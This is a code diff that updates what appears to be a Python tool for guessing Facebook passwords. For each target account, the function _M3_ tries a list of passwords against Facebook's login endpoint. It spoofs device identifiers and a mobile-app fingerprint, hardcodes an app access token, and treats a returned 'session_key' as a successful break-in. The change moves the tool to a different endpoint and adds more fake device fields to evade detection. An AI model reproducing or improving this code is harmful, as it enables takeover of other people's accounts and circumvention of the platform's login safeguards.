@@ -446,23 +446,32 @@ def _M3_(ids,pasx):
                 for ps in pasx:
                         session = requests.Session()
                         user_agent=userag1()
-                        data={
-                        'adid': str(uuid.uuid4()),
-                        'format': 'json',
-                        'device_id': str(uuid.uuid4()),
-                        'email': ids,
-                        'password': ps,
-                        'generate_analytics_claims': '1', 
-                        'credentials_type': 'password',
-                        'source': 'login',
-                        'error_detail_type': 'button_with_disabled',
-                        'enroll_misauth': 'false', 
-                        'generate_session_cookies': '1', 
-                        'generate_machine_id': '1', 
-                        'meta_inf_fbmeta': '', 
-                        'currently_logged_in_userid': '0', 
-                        'fb_api_req_friendly_name': 'authenticate'}
-
+                        data = {
+                        'adid':str(uuid.uuid4()),
+                        'format':'json',
+                        'device':gtt,
+                        'device_id':str(uuid.uuid4()),
+                        'email':ids,
+                        'password':ps,
+                        "logged_out_id": str(uuid.uuid4()),
+                        "hash_id": str(uuid.uuid4()),
+                        "reg_instance": str(uuid.uuid4()),
+                        "session_id": str(uuid.uuid4()),
+                        "advertiser_id": str(uuid.uuid4()),
+                        'generate_analytics_claims':'1',
+                        'credentials_type':'password',
+                        'source':'login',
+                        "sim_country": "id",
+                        "network_country": "id",
+                        "relative_url": "method/auth.login",
+                        'error_detail_type':'button_with_disabled',
+                        'enroll_misauth':'false',
+                        'generate_session_cookies':'1',
+                        'generate_machine_id':'1',
+                        "locale":"en_US","client_country_code":"US",
+                        'fb_api_req_friendly_name':'authenticate',
+                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+                        accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                         head={
                              "method": 'GET', 
                              "path": '/',
@@ -480,8 +489,7 @@ def _M3_(ids,pasx):
                              "sec-fetch-user": '?1',
                              "upgrade-insecure-requests": '1',
                             "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
-
-                        url1="https://api.facebook.com/method/auth.login"
+                        url1='https://p.facebook.com/auth/login'
                         BLACK=session.post(url1,data=data,headers=head,allow_redirects=False).text
                         q = json.loads(BLACK)
                         if 'session_key' in q:
